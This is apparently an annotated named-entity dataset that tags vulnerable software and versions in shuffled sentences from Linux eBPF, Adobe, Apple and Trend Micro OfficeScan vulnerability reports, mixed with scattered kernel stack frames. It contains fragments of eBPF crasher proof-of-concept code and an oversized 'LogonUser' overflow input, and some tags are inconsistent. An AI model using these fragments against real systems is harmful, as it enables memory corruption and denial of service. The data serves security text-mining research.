In O O
case O O
UFO O O
packet O O
lengths O O
exceeds O O
MTU O O
, O O
copy O O
= O O
maxfraglen O O
- O O
skb- O O
> O O
len O O
becomes O O
negative O O
on O O
the O O
non-UFO O O
path O O
and O O
the O O
branch O O
to O O
allocate O O
new O O
skb O O
is O O
taken O O
. O O

Fraggap O O
can O O
exceed O O
MTU O O
, O O
causing O O
copy O O
= O O
datalen O O
- O O
transhdrlen O O
- O O
fraggap O O
to O O
become O O
negative O O
. O O

Subsequently O O
skb_copy_and_csum_bits O O
( O O
) O O
writes O O
out-of-bounds O O
. O O

A O O
similar O O
issue O O
is O O
present O O
in O O
IPv6 O O
code O O
. O O

However O O
in O O
between O O
two O O
send O O
( O O
) O O
calls O O
, O O
the O O
append O O
path O O
can O O
be O O
switched O O
from O O
UFO O O
to O O
non-UFO O O
one O O
, O O
which O O
leads O O
to O O
a O O
memory O O
corruption O O
. O O

This O O
triggers O O
fragmentation O O
and O O
computation O O
of O O
fraggap O O
= O O
skb_prev- O O
> O O
len O O
- O O
maxfraglen O O
. O O

Linux O O
kernel O O
: O O
Exploitable O O
memory O O
corruption O O
due O O
to O O
UFO O O
to O O
non-UFO O O
path O O
switch O O
. O O

When O O
building O O
a O O
UFO O O
packet O O
with O O
MSG_MORE O O
ip_append_data O O
( O O
) O O
calls O O
ip_ufo_append_data O O
( O O
) O O
to O O
append O O
. O O

The O O
bug O O
was O O
introduced O O
in O O
e89e9cf539a2 O O
( O O
[ O O
IPv4/IPv6 O O
] O O
: O O
UFO O O
Scatter-gather O O
approach O O
) O O
on O O
Oct O O
18 O O
2005 O O
. O O

gtk-vnc S-vulnerable_software pair_0
0.4.2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
older S-vulnerable_version pair_0
doesn O O
t O O
check O O
framebuffer O O
boundaries O O
correctly O O
when O O
updating O O
framebuffer O O
which O O
may O O
lead O O
to O O
memory O O
corruption O O
when O O
rendering O O

check_stack_boundary O O
function O O
in O O
kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
mishandling O O
of O O
invalid O O
variable O O
stack O O
read O O
operations O O
. O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
10599.404040 O O
] O O

This O O
should O O
be O O
usable O O
to O O
get O O
read+write O O
access O O
to O O
spilled O O
stack O O
pointers O O
. O O

iov_iter_init+0x77/0xb0 O O
[ O O
117.274786 O O
] O O

vfs_write+0x23e/0x340 O O
[ O O
10599.404092 O O
] O O

) O O
; O O
int O O
socks O O
; O O
if O O
( O O
socketpair O O
( O O
AF_UNIX O O
, O O
SOCK_DGRAM O O
, O O
0 O O
, O O
socks O O
) O O
) O O
err O O
( O O
1 O O
, O O
socketpair O O
) O O
; O O
if O O
( O O
setsockopt O O
( O O
socks O O
, O O
SOL_SOCKET O O
, O O
SO_ATTACH_BPF O O
, O O
& O O
progfd O O
, O O
sizeof O O
( O O
int O O
) O O
) O O
) O O
err O O
( O O
1 O O
, O O
setsockopt O O
) O O
; O O
if O O
( O O
write O O
( O O
socks O O
, O O
a O O
, O O
1 O O
) O O
! O O
= O O
1 O O
) O O
err O O
( O O
1 O O
, O O
write O O
) O O
; O O
char O O
c O O
; O O
if O O
( O O
read O O
( O O
socks O O
, O O
& O O
c O O
, O O
1 O O
) O O
! O O
= O O
1 O O
) O O
err O O
( O O
1 O O
, O O
read O O
res O O
) O O
; O O
return O O
0 O O
; O O
} O O
user O O
@ O O
... O O
ian O O
: O O
~/bpf_range O O
$ O O
gcc O O
-o O O
crasher_badtrunc O O
crasher_badtrunc.c O O
-Wall O O
& O O
& O O
./crasher_badtrunc O O
ok O O
so O O
far O O

unix_stream_connect+0x840/0x840 O O
[ O O
10599.404046 O O
] O O

Debian O O
assigned O O
CVE-2017-16995 O O
for O O
this O O
issue O O
. O O

The O O
following O O
bugs O O
were O O
introduced O O
in O O
4.14 O O
: O O
fixed O O
by O O
bpf/verifier O O
: O O
fix O O
bounds O O
calculation O O
on O O
BPF_RSH O O
Incorrect O O
signed O O
bounds O O
were O O
being O O
computed O O
for O O
BPF_RSH O O
. O O

sock_alloc_inode+0x46/0x110 O O
[ O O
117.274731 O O
] O O

lock_acquire.isra.31+0x2d/0xb40 O O
[ O O
10599.404059 O O
] O O

vfs_write+0xe9/0x240 O O
[ O O
10599.404110 O O
] O O

wake_up_common_lock+0xaf/0x130 O O
[ O O
10599.404065 O O
] O O

sk_filter_trim_cap+0x5c/0x4e0 O O
[ O O
117.274688 O O
] O O

bpf_prog_run64+0xc0/0xc0 O O
[ O O
10599.404017 O O
] O O

sk_filter_trim_cap+0xf7/0x4e0 O O
[ O O
10599.404028 O O
] O O

lockdep_sys_exit+0x16/0x8e O O
[ O O
117.274827 O O
] O O

iov_iter_init+0x77/0xb0 O O
[ O O
10599.404089 O O
] O O

lock_acquire.isra.31+0x2d/0xb40 O O
[ O O
117.274746 O O
] O O

bpf_jit_compile+0x30/0x30 O O
[ O O
117.274693 O O
] O O

alloc_skb_with_frags+0x90/0x2c0 O O
[ O O
117.274697 O O
] O O

fixed O O
by O O
bpf O O
: O O
fix O O
32-bit O O
ALU O O
op O O
verification O O
adjust_scalar_min_max_vals O O
( O O
) O O
only O O
truncates O O
its O O
inputs O O
and O O
otherwise O O
operates O O
on O O
64-bit O O
numbers O O
while O O
the O O
BPF O O
interpreter O O
and O O
JIT O O
perform O O
32-bit O O
arithmetic O O
. O O

sock_sendmsg+0x80/0x80 O O
[ O O
117.274768 O O
] O O

SyS_read+0x130/0x130 O O
[ O O
117.274823 O O
] O O

The O O
following O O
bug O O
was O O
introduced O O
in O O
4.9 S-vulnerable_version O
: O O
fixed O O
by O O
bpf O O
: O O
fix O O
incorrect O O
sign O O
extension O O
in O O
check_alu_op O O
( O O
) O O
check_alu_op O O
( O O
) O O
did O O
not O O
distinguish O O
between O O
BPF_ALU64|BPF_MOV|BPF_K O O
( O O
load O O
32-bit O O
immediate O O
, O O
sign-extended O O
to O O
64-bit O O
) O O
and O O
BPF_ALU|BPF_MOV|BPF_K O O
( O O
load O O
32-bit O O
immediate O O
, O O
zero-padded O O
to O O
64-bit O O
) O O
; O O
it O O
performed O O
sign O O
extension O O
in O O
both O O
cases O O
. O O

do_raw_spin_unlock+0x86/0x120 O O
[ O O
117.274782 O O
] O O

vfs_write+0xe9/0x240 O O
[ O O
117.274817 O O
] O O

unix_dgram_sendmsg+0x3e2/0x960 O O
[ O O
10599.404033 O O
] O O

Debian O O
assigned O O
CVE-2017-16996 O O
for O O
this O O
issue O O
. O O

alloc_skb_with_frags+0x90/0x2c0 O O
[ O O
10599.404010 O O
] O O

sk_filter_trim_cap+0xf7/0x4e0 O O
[ O O
117.274715 O O
] O O

fget_light+0x9b/0xb0 O O
[ O O
10599.404107 O O
] O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
117.274724 O O
] O O

But O O
then O O
, O O
it O O
computes O O
the O O
new O O
arithmetic O O
bounds O O
as O O
the O O
intersection O O
between O O
the O O
old O O
arithmetic O O
bounds O O
and O O
the O O
bounds O O
resulting O O
from O O
the O O
bitwise O O
tristate O O
representation O O
. O O

One O O
of O O
the O O
bugs O O
was O O
introduced O O
in O O
4.9 S-vulnerable_version O
, O O
the O O
others O O
were O O
only O O
introduced O O
in O O
4.14 S-vulnerable_version O
. O O

This O O
means O O
that O O
the O O
output O O
of O O
e.g O O
. O O

The O O
old O O
code O O
first O O
mirrors O O
the O O
clearing O O
of O O
the O O
high O O
32 O O
bits O O
in O O
the O O
bitwise O O
tristate O O
representation O O
, O O
which O O
is O O
correct O O
. O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
10599.404036 O O
] O O

This O O
is O O
a O O
kernel O O
pointer O O
leak O O
. O O

fixed O O
by O O
bpf O O
: O O
force O O
strict O O
alignment O O
checks O O
for O O
stack O O
pointers O O
The O O
verifier O O
did O O
not O O
force O O
strict O O
alignment O O
checks O O
for O O
stack O O
pointers O O
, O O
but O O
the O O
tracking O O
of O O
stack O O
spills O O
relies O O
on O O
it O O
; O O
unaligned O O
stack O O
accesses O O
can O O
lead O O
to O O
corruption O O
of O O
spilled O O
registers O O
, O O
which O O
is O O
exploitable O O
. O O

sk_filter_trim_cap+0x5c/0x4e0 O O
[ O O
10599.404022 O O
] O O

unix_stream_connect+0x840/0x840 O O
[ O O
117.274755 O O
] O O

SyS_read+0x130/0x130 O O
[ O O
10599.404125 O O
] O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
117.274742 O O
] O O

sock_create+0x7f/0x2c0 O O
[ O O
117.274737 O O
] O O

bpf_jit_compile+0x30/0x30 O O
[ O O
10599.404006 O O
] O O

PoC O O
for O O
bpf O O
: O O
fix O O
incorrect O O
sign O O
extension O O
in O O
check_alu_op O O
( O O
) O O
Here O O
is O O
a O O
crasher O O
that O O
tries O O
to O O
write O O
to O O
a O O
noncanonical O O
address O O
. O O

If O O
the O O
old O O
upper O O
signed O O
bound O O
was O O
positive O O
and O O
the O O
old O O
lower O O
signed O O
bound O O
was O O
negative O O
, O O
this O O
could O O
cause O O
the O O
new O O
upper O O
signed O O
bound O O
to O O
be O O
too O O
low O O
, O O
leading O O
to O O
security O O
issues O O
. O O

SyS_write+0xa7/0x130 O O
[ O O
117.274820 O O
] O O

fd_install+0x5/0x160 O O
[ O O
10599.404102 O O
] O O

SyS_write+0xa7/0x130 O O
[ O O
10599.404121 O O
] O O

sock_sendmsg+0x6b/0x80 O O
[ O O
117.274759 O O
] O O

A O O
few O O
BPF O O
verifier O O
bugs O O
in O O
the O O
Linux O O
kernel O O
, O O
most O O
of O O
which O O
can O O
be O O
used O O
for O O
controlled O O
memory O O
corruption O O
, O O
have O O
been O O
fixed O O
over O O
the O O
last O O
days O O
. O O

sock_alloc_inode+0x46/0x110 O O
[ O O
10599.404043 O O
] O O

kernel_read+0xa0/0xa0 O O
[ O O
117.274805 O O
] O O

sk_filter_trim_cap+0x5c/0x4e0 O O
[ O O
10599.404000 O O
] O O

kernel_read+0xa0/0xa0 O O
[ O O
10599.404098 O O
] O O

fget_light+0x9b/0xb0 O O
[ O O
117.274813 O O
] O O

sock_sendmsg+0x6b/0x80 O O
[ O O
10599.404071 O O
] O O

bpf_prog_run32+0x83/0xc0 O O
[ O O
10599.404013 O O
] O O

wake_up_common_lock+0xaf/0x130 O O
[ O O
117.274752 O O
] O O

unix_dgram_sendmsg+0x3e2/0x960 O O
[ O O
117.274720 O O
] O O

sock_create+0x7f/0x2c0 O O
[ O O
10599.404049 O O
] O O

sock_write_iter+0x11d/0x1d0 O O
[ O O
117.274762 O O
] O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
10599.404054 O O
] O O

) O O
; O O
int O O
socks O O
; O O
if O O
( O O
socketpair O O
( O O
AF_UNIX O O
, O O
SOCK_DGRAM O O
, O O
0 O O
, O O
socks O O
) O O
) O O
err O O
( O O
1 O O
, O O
socketpair O O
) O O
; O O
if O O
( O O
setsockopt O O
( O O
socks O O
, O O
SOL_SOCKET O O
, O O
SO_ATTACH_BPF O O
, O O
& O O
progfd O O
, O O
sizeof O O
( O O
int O O
) O O
) O O
) O O
err O O
( O O
1 O O
, O O
setsockopt O O
) O O
; O O
if O O
( O O
write O O
( O O
socks O O
, O O
a O O
, O O
1 O O
) O O
! O O
= O O
1 O O
) O O
err O O
( O O
1 O O
, O O
write O O
) O O
; O O
char O O
c O O
; O O
if O O
( O O
read O O
( O O
socks O O
, O O
& O O
c O O
, O O
1 O O
) O O
! O O
= O O
1 O O
) O O
err O O
( O O
1 O O
, O O
read O O
res O O
) O O
; O O
return O O
0 O O
; O O
} O O
user O O
@ O O
... O O
ian O O
: O O
~/bpf_range O O
$ O O
gcc O O
-o O O
crasher_badimm O O
crasher_badimm.c O O
-Wall O O
& O O
& O O
./crasher_badimm O O
ok O O
so O O
far O O

unix_stream_connect+0x840/0x840 O O
[ O O
117.274734 O O
] O O

bpf_prog_run32+0x83/0xc0 O O
[ O O
117.274700 O O
] O O

` O O
( O O
u32 O O
) O O
0x40000000 O O
( O O
u32 O O
) O O
5` O O
will O O
be O O
incorrect O O
. O O

sock_write_iter+0x11d/0x1d0 O O
[ O O
10599.404075 O O
] O O

lockdep_sys_exit+0x16/0x8e O O
[ O O
10599.404129 O O
] O O

entry_SYSCALL_64_fastpath+0x1e/0x86 O O
[ O O
117.274728 O O
] O O

sock_sendmsg+0x80/0x80 O O
[ O O
10599.404080 O O
] O O

bpf_prog_run64+0xc0/0xc0 O O
[ O O
117.274705 O O
] O O

vfs_write+0x23e/0x340 O O
[ O O
117.274799 O O
] O O

sk_filter_trim_cap+0x5c/0x4e0 O O
[ O O
117.274710 O O
] O O

lockdep_sys_exit_thunk+0x16/0x2b O O
[ O O
10599.404133 O O
] O O

fixed O O
by O O
bpf O O
: O O
fix O O
incorrect O O
tracking O O
of O O
register O O
size O O
truncation O O
The O O
BPF O O
verifier O O
did O O
not O O
properly O O
handle O O
register O O
truncation O O
to O O
a O O
smaller O O
size O O
. O O

do_raw_spin_unlock+0x86/0x120 O O
[ O O
10599.404084 O O
] O O

unix_stream_connect+0x840/0x840 O O
[ O O
10599.404068 O O
] O O

fd_install+0x5/0x160 O O
[ O O
117.274809 O O
] O O

For O O
the O O
other O O
issues O O
, O O
examples O O
of O O
how O O
to O O
trigger O O
them O O
are O O
in O O
the O O
added O O
BPF O O
selftests O O
. O O

lockdep_sys_exit_thunk+0x16/0x2b O O
[ O O
117.274831 O O
] O O

Subject O O
: O O
Linux S-vulnerable_software pair_0
> S-vulnerable_version pair_0
=4.9 S-vulnerable_version pair_0
: O O
eBPF O O
memory O O
corruption O O
bugs O O

kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
improper O O
use O O
of O O
pointers O O
in O O
place O O
of O O
scalars O O
. O O

kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
integer O O
overflow O O
and O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
unrestricted O O
integer O O
values O O
for O O
pointer O O
arithmetic O O
. O O

kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
incorrect O O
BPF_RSH O O
signed O O
bounds O O
calculations O O
. O O

kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
mishandling O O
of O O
32-bit O O
ALU O O
ops O O
. O O

ntguard.sys S-vulnerable_software pair_0
and O O
ntguard_x64.sys S-vulnerable_software pair_0
0.18780.0.0 S-vulnerable_version pair_0
in O O
IKARUS S-vulnerable_software pair_1
anti.virus S-vulnerable_software pair_1
2.16.15 S-vulnerable_version pair_1
have O O
a O O
Memory O O
Corruption O O
vulnerability O O
via O O
a O O
0x83000084 O O
DeviceIoControl O O
request O O
. O O

check_alu_op O O
function O O
in O O
kernel/bpf/verifier.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.14.8 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
incorrect O O
sign O O
extension O O
. O O

Attackers O O
can O O
exploit O O
the O O
vulnerability O O
by O O
using O O
the O O
out O O
of O O
bounds O O
access O O
for O O
unintended O O
reads O O
, O O
writes O O
, O O
or O O
frees O O
potentially O O
leading O O
to O O
code O O
corruption O O
, O O
control-flow O O
hijack O O
, O O
or O O
information O O
leak O O
attack O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
type O O
confusion O O
vulnerability O O
in O O
the O O
EMF O O
processing O O
module O O
. O O

The O O
issue O O
causes O O
the O O
program O O
to O O
access O O
an O O
object O O
using O O
an O O
incompatible O O
type O O
, O O
leading O O
to O O
an O O
out O O
of O O
bounds O O
memory O O
access O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
and S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
: O O
2017.012.20098 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
, O O
2017.011.30066 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
, O O
2015.006.30355 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.22 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
. O O

The O O
mismatch O O
between O O
an O O
old O O
and O O
a O O
new O O
object O O
can O O
provide O O
an O O
attacker O O
with O O
unintended O O
memory O O
access O O
potentially O O
leading O O
to O O
code O O
corruption O O
, O O
control-flow O O
hijack O O
, O O
or O O
an O O
information O O
leak O O
attack O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
JavaScript O O
engine O O
. O O

Successful O O
exploitation O O
could O O
lead O O
to O O
arbitrary O O
code O O
execution O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
JavaScript O O
engine O O
API O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
JavaScript O O
API O O
engine O O
. O O

This O O
vulnerability O O
is O O
an O O
instance O O
of O O
a O O
use O O
after O O
free O O
vulnerability O O
in O O
the O O
MakeAccessible O O
plugin O O
, O O
when O O
creating O O
an O O
internal O O
data O O
structure O O
. O O

In O O
radare S-vulnerable_software pair_0
2.0.1 S-vulnerable_version pair_0
, O O
a O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
store_versioninfo_gnu_verdef O O
( O O
) O O
and O O
store_versioninfo_gnu_verneed O O
( O O
) O O
in O O
libr/bin/format/elf/elf.c O O
, O O
as O O
demonstrated O O
by O O
an O O
invalid O O
free O O
. O O

This O O
error O O
is O O
due O O
to O O
improper O O
sh_size O O
validation O O
when O O
allocating O O
memory O O
. O O

JerryScript S-vulnerable_software pair_0
1.0 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
jmem_heap_alloc_block_internal O O
heap O O
memory O O
corruption O O
) O O
or O O
possibly O O
execute O O
arbitrary O O
code O O
via O O
a O O
crafted O O
.js O O
file O O
, O O
because O O
unrecognized O O
characters O O
cause O O
incorrect O O
0x00 O O
characters O O
in O O
bytecode.literal O O
data O O
. O O

Because O O
of O O
an O O
integer O O
overflow O O
in O O
sam2p S-vulnerable_software pair_0
0.49.3 S-vulnerable_version pair_0
, O O
a O O
loop O O
executes O O
0xffffffff O O
times O O
, O O
ending O O
with O O
an O O
invalid O O
read O O
of O O
size O O
1 O O
in O O
the O O
Image O O
: O O
:Indexed O O
: O O
:sortPal O O
function O O
in O O
image.cpp O O
. O O

However O O
, O O
this O O
also O O
causes O O
memory O O
corruption O O
because O O
of O O
an O O
attempted O O
write O O
to O O
the O O
invalid O O
d O O
[ O O
0xfffffffe O O
] O O
array O O
element O O
. O O

In O O
Poppler S-vulnerable_software pair_0
0.59.0 S-vulnerable_version pair_0
, O O
memory O O
corruption O O
occurs O O
in O O
a O O
call O O
to O O
Object O O
: O O
:streamGetChar O O
in O O
Object.h O O
after O O
a O O
repeating O O
series O O
of O O
Gfx O O
: O O
:display O O
, O O
Gfx O O
: O O
:go O O
, O O
Gfx O O
: O O
:execOp O O
, O O
Gfx O O
: O O
:opShowText O O
, O O
and O O
Gfx O O
: O O
:doShowText O O
calls O O
( O O
aka O O
a O O
Gfx.cc O O
infinite O O
loop O O
) O O
. O O

tpacket_rcv O O
function O O
in O O
net/packet/af_packet.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.13 S-vulnerable_version pair_0
mishandles O O
vnet O O
headers O O
, O O
which O O
might O O
allow O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
buffer O O
overflow O O
, O O
and O O
disk O O
and O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
via O O
crafted O O
system O O
calls O O
. O O

An O O
Unauthorized O O
Memory O O
Corruption O O
vulnerability O O
in O O
Trend S-vulnerable_software pair_0
Micro S-vulnerable_software pair_0
OfficeScan S-vulnerable_software pair_0
11.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
XG S-vulnerable_version pair_0
may O O
allow O O
remote O O
unauthenticated O O
users O O
who O O
can O O
access O O
the O O
OfficeScan O O
server O O
to O O
target O O
cgiShowClientAdm.exe O O
and O O
cause O O
memory O O
corruption O O
issues O O
. O O

Permission O O
is O O
explicitly O O
given O O
for O O
insertion O O
in O O
vulnerability O O
databases O O
and O O
similar O O
, O O
provided O O
that O O
due O O
credit O O
is O O
given O O
to O O
the O O
author O O
. O O

The O O
author O O
is O O
not O O
responsible O O
for O O
any O O
misuse O O
of O O
the O O
information O O
contained O O
herein O O
and O O
accepts O O
no O O
responsibility O O
for O O
any O O
damage O O
caused O O
by O O
the O O
use O O
or O O
misuse O O
of O O
this O O
information O O
. O O

The O O
server O O
, O O
through O O
the O O
web-based O O
management O O
console O O
, O O
makes O O
it O O
easy O O
to O O
set O O
coordinated O O
security O O
policies O O
and O O
deploy O O
updates O O
to O O
every O O
agent O O
. O O

The O O
OfficeScan O O
agent O O
guards O O
the O O
endpoint O O
and O O
reports O O
its O O
security O O
status O O
to O O
the O O
server O O
. O O

Vulnerability O O
Type O O
: O O
Unauthorized O O
Remote O O
Memory O O
Corruption O O
CVE O O
Reference O O
: O O
CVE-2017-14089 O O
Security O O
Issue O O
: O O
Remote O O
unauthenticated O O
attackers O O
that O O
can O O
make O O
connection O O
the O O
TrendMicro O O
OfficeScan O O
XG O O
application O O
targeting O O
the O O
cgiShowClientAdm.exe O O
process O O
can O O
cause O O
memory O O
corruption O O
issues O O
. O O

An O O
integrated O O
solution O O
, O O
OfficeScan O O
consists O O
of O O
the O O
OfficeScan O O
agent O O
program O O
that O O
resides O O
at O O
the O O
endpoint O O
and O O
a O O
server O O
program O O
that O O
manages O O
all O O
agents O O
. O O

; O O
LogonUser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA O O
; O O
ReadOnlyIds=8.56 O O
. O O

Permission O O
is O O
hereby O O
granted O O
for O O
the O O
redistribution O O
of O O
this O O
advisory O O
, O O
provided O O
that O O
it O O
is O O
not O O
altered O O
except O O
by O O
reformatting O O
it O O
, O O
and O O
that O O
due O O
credit O O
is O O
given O O
. O O

All O O
content O O
( O O
c O O
) O O
. O O

The O O
author O O
prohibits O O
any O O
malicious O O
use O O
of O O
security O O
related O O
information O O
or O O
exploits O O
by O O
the O O
author O O
or O O
elsewhere O O
. O O

Trend S-vulnerable_software pair_0
Micro S-vulnerable_software pair_0
OfficeScan S-vulnerable_software pair_0
11.0/XG S-vulnerable_version pair_0
( O O
12.0 S-vulnerable_version pair_0
) O O
- O O
Memory O O
Corruption O O

Trend S-vulnerable_software pair_0
Micro S-vulnerable_software pair_0
OfficeScan S-vulnerable_software pair_0
v11.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
XG S-vulnerable_version pair_0
( O O
12.0 S-vulnerable_version pair_0
) O O
Unauthorized O O
Remote O O
Memory O O
Corruption O O
CVE-2017-14089 O O
( O O
apparitionsec O O
hyp3rlinx O O
) O O

An O O
attacker O O
must O O
first O O
obtain O O
the O O
ability O O
to O O
execute O O
low-privileged O O
code O O
on O O
the O O
target O O
system O O
in O O
order O O
to O O
exploit O O
the O O
vulnerability O O
. O O

Memory O O
Corruption O O
Privilege O O
Escalation O O
vulnerabilities O O
in O O
Trend S-vulnerable_software pair_0
Micro S-vulnerable_software pair_0
OfficeScan S-vulnerable_software pair_0
11.0 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
XG S-vulnerable_version pair_0
allows O O
local O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
and O O
escalate O O
privileges O O
to O O
resources O O
normally O O
reserved O O
for O O
the O O
kernel O O
on O O
vulnerable O O
installations O O
by O O
exploiting O O
tmwfp.sys O O
. O O

An O O
integer O O
overflow O O
in O O
qla2x00_sysfs_write_optrom_ctl O O
function O O
in O O
drivers/scsi/qla2xxx/qla_attr.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
through S-vulnerable_version pair_0
4.12.10 S-vulnerable_version pair_0
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
system O O
crash O O
) O O
by O O
leveraging O O
root O O
access O O
. O O

The O O
issue O O
involves O O
the O O
Intel O O
Graphics O O
Driver O O
component O O
. O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.13.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

An O O
issue O O
was O O
discovered O O
in O O
certain O O
Apple O O
products O O
. O O

It O O
allows O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
in O O
a O O
privileged O O
context O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
app O O
. O O

The O O
issue O O
involves O O
the O O
WebKit O O
component O O
. O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.7.2 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.0.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
web O O
site O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
7.2 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.2 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
Kernel O O
component O O
. O O

soopt_mcopyin O O
, O O
which O O
should O O
copyin O O
the O O
data O O
for O O
the O O
mbuf O O
from O O
userspace O O
, O O
has O O
the O O
following O O
code O O
: O O
error O O
= O O
copyin O O
( O O
sopt- O O
> O O
sopt_val O O
, O O
mtod O O
( O O
m O O
, O O
char O O
) O O
, O O
m- O O
> O O
m_len O O
) O O
; O O
if O O
( O O
error O O
! O O
= O O
0 O O
) O O
{ O O
m_freem O O
( O O
m0 O O
) O O
; O O
return O O
( O O
error O O
) O O
; O O
} O O
This O O
means O O
that O O
if O O
the O O
copyin O O
fails O O
, O O
by O O
for O O
example O O
providing O O
an O O
invalid O O
userspace O O
pointer O O
, O O
soopt_mcopyin O O
will O O
free O O
the O O
mbuf O O
. O O

This O O
PoC O O
will O O
just O O
hit O O
a O O
panic O O
inside O O
m_free O O
when O O
it O O
detects O O
a O O
double-free O O
but O O
do O O
note O O
that O O
this O O
can O O
not O O
detect O O
all O O
double O O
frees O O
and O O
this O O
issue O O
is O O
still O O
exploitable O O
with O O
sufficient O O
grooming/cache O O
manipulation O O
. O O

The O O
relevant O O
code O O
is O O
: O O
